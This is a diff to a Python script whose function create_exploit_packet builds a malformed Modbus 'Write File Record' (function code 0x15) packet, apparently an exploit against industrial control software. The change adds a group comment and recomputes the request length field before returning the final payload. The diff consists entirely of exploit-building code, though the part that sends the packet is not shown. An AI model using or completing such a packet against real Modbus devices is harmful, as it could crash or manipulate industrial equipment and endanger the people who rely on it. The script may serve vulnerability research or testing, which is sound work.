@@ -7,6 +7,8 @@ import struct
 def create_exploit_packet():
     # Modbus Write File Record header
     function_code = 0x15
+
+    # First group
     reference_type_1 = 0x06
     file_number_1 = 0x0001
     record_number_1 = 0x0000
@@ -34,7 +36,13 @@ def create_exploit_packet():
                            record_length_2)
     payload += b'\x00\x00'  # Minimum 2 bytes of data for the second group
 
-    return payload
+    # Calculate request_data_length
+    request_data_length = len(payload) - 1  # Subtract function_code byte
+
+    # Construct final payload with correct request_data_length
+    final_payload = struct.pack('>BB', function_code, request_data_length) + payload[1:]
+    
+    return final_payload
 
 exploit_packet = create_exploit_packet()
 
